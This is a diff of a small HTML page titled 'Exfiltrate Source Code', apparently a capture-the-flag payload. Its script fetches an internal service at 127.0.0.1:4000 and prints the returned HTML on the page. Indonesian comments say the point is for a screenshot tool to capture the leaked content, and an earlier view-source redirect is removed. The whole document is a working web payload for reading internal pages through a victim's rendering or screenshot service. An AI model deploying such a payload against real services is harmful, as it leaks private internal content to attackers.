@@ -1,3 +1,23 @@
-<script>
-    window.location.href = "view-source:http://127.0.0.1:4000";
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exfiltrate Source Code</title>
+</head>
+<body style="background: white; color: black; font-family: monospace; padding: 20px;">
+    <h2>Source Code Blog Internal:</h2>
+    <pre id="output">Loading source code...</pre>
+
+    <script>
+        // Mengambil HTML dari blog internal
+        fetch('http://127.0.0.1:4000')
+            .then(response => response.text())
+            .then(data => {
+                // Menampilkan kode HTML ke layar agar terfoto oleh screenshot
+                document.getElementById('output').innerText = data;
+            })
+            .catch(err => {
+                document.getElementById('output').innerText = "Error mengambil data: " + err;
+            });
+    </script>
+</body>
+</html>
